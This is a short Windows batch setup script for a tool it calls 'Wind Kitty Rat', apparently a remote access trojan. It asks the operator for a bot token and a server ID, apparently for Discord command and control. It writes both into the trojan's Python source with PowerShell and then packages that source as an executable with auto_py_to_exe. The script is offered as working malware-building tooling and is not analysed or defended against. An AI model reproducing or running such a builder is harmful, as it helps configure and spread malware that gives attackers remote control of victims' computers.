@Echo off
color 5
title Wind Kitty Rat Setup - %random%%random%
echo.
echo Yb        dP 88 88b 88 8888b.      88  dP 88 888888 888888 Yb  dP     88""Yb    db    888888 
echo  Yb  db  dP  88 88Yb88  8I  Yb     88odP  88   88     88    YbdP      88__dP   dPYb     88   
echo   YbdPYbdP   88 88 Y88  8I  dY     88"Yb  88   88     88     8P       88"Yb   dP__Yb    88   
echo    YP  YP    88 88  Y8 8888Y"      88  Yb 88   88     88    dP        88  Yb dP""""Yb   88   
echo.
    echo [%TIME%] {DEBUG} IF YOU HAVE ISSUE FOLLOW STEPS ON GITHUB!

    set /p bottoken="Enter Bot Token: "
    powershell -Command "(Get-Content WindKittyRat.py -Raw) -replace '%%token%%', '%bottoken%' | Set-Content WindKittyRat.py -Encoding UTF8"

    set /p serverid="Enter Server ID: "
    powershell -Command "(Get-Content WindKittyRat.py -Raw) -replace '%%id%%', '%serverid%' | Set-Content WindKittyRat.py -Encoding UTF8"

    python -m auto_py_to_exe
pause